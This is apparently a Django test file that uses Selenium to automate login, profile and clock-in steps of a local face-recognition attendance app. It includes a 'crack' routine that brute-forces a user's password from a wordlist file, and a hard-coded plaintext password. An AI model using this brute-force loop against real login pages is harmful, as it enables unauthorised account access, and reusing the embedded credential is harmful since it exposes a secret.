# Create your tests here.
# import sys
import logging
# import platform
import sys
import time
import traceback
from datetime import datetime, timedelta

# from colors import BLUE, CYAN, GREEN, RESET
import bs4 as BeautifulSoup
import requests
from django.test import TestCase
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from selenium import webdriver
from selenium.webdriver.common.action_chains import ActionChains
from selenium.webdriver.common.actions.wheel_input import ScrollOrigin
from selenium.webdriver.common.by import By
from selenium.webdriver.common.desired_capabilities import DesiredCapabilities
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.firefox.firefox_profile import FirefoxProfile
# from selenium.webdriver.chrome.options import Options
from selenium.webdriver.firefox.options import Options
# from selenium.webdriver.firefox.service import Service
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.support.ui import Select, WebDriverWait
from selenium.common import exceptions

logging.basicConfig(level=logging.INFO, format='%(levelname)-8s %(message)s')
logger = logging.getLogger(__name__)

profile = FirefoxProfile()

options = Options()

options.accept_insecure_certs = True

options.add_argument("--use-fake-ui-for-media-stream")

# options.add_argument("--headless")

options.profile = profile

# cookie_manager = CookieManager(driver)

# cookie_manager.store_cookies()

options.set_preference("browser.sessionstore.enabled", True)

profile.set_preference("browser.sessionstore.privacy_level", 0)

options.set_preference("security.tls.version.min", 1)

options.set_preference(
    "profile.default_content_setting_values.media_stream_camera", 1)

options.set_preference(
    "profile.default_content_setting_values.media_stream_mic", 1)

options.set_preference("profile.default_content_setting_values.geolocation", 1)

options.set_preference(
    "profile.default_content_setting_values.notifications", 1)

driver = webdriver.Firefox(options=options)

act = ActionChains(driver)
'''Define Testcase class'''


class FRASTestCase:
    def __init__(self):
        self.username = 'skye'
        self.password = 'Swskye@dragon17'

    '''Define login function'''

    def login(self):
        # Get the web app login page
        driver.get('http://127.0.0.1:8080')

        # Enter username field
        username = driver.find_element(By.ID, 'username')
        # Send username to the field
        username.send_keys(self.username)

        # Get password field
        password = driver.find_element(By.ID, 'password')
        # Send password to the field
        password.send_keys(self.password)

        # Get login submit button
        submit = driver.find_element(By.TAG_NAME, 'button')

        # Submit the form
        submit.click()

    def crack(self):
        user = 'wambua'
        # Get the web app login page
        driver.get('http://127.0.0.1:8080')
        print(
            f"\033[1;94m[+]\033[0m Set username -> \033[1;93m{user}\033[0m")
        with open("/home/skye/PyHack/bruteforce/wordLGENEkosV.txt", "r") as passwords:
            for passwd in passwords:
                try:
                    # Enter username field
                    username = driver.find_element(By.ID, 'username')
                    # Send username to the field
                    username.send_keys(user)

                    # Get password field
                    password = driver.find_element(By.ID, 'password')
                    # Send password to the field
                    password.send_keys(passwd)

                    # Get login submit button
                    submit = driver.find_element(By.TAG_NAME, 'button')

                    # Submit the form
                    submit.click()
                    print(
                        f"\033[1;35m[!!]\033[0m Bruteforcing With Password \033[1;93m{passwd}\033[0m")
                except exceptions.NoSuchElementException:
                    print(
                        f"\n\033[1;94m[+]\033[0m Username --> \033[1;92m{user}\033[0m")
                    print(
                        f"\033[1;94m[+]\033[0m Password --> \033[1;92m{passwd}\033[0m")
                    driver.quit()
                    exit(0)

    # Go to profile page

    def profile(self):
        driver.find_element(By.TAG_NAME, 'button').click()

        # Click profile button
        driver.find_element(By.LINK_TEXT, 'Profile').click()

    def clockIn(self):
        # Move cursor to the menu
        act.move_to_element(driver.find_element(By.TAG_NAME, 'button'))
        WebDriverWait(driver, 10)
        # Toggle menu display
        driver.find_element(By.TAG_NAME, 'button').click()

        # Click clockIn from the menu
        driver.find_element(By.LINK_TEXT, 'Clock In').click()

        def grantCameraAcess():
            # Get the DesiredCapabilities instance
            try:
                alert = driver.switch_to.alert
                alert.accept()
            except Exception as e:
                print(e)
        grantCameraAcess()

        def denyCameraAcess():
            # deny
            options.add_argument("--use-fake-ui-for-media-stream")
            options.add_argument("--use-fake-device-for-media-stream")
        # grantCameraAcess()


if __name__ == "__main__":
    init = FRASTestCase()
    # init.login()
    # init.profile()
    # init.clockIn()
    init.crack()
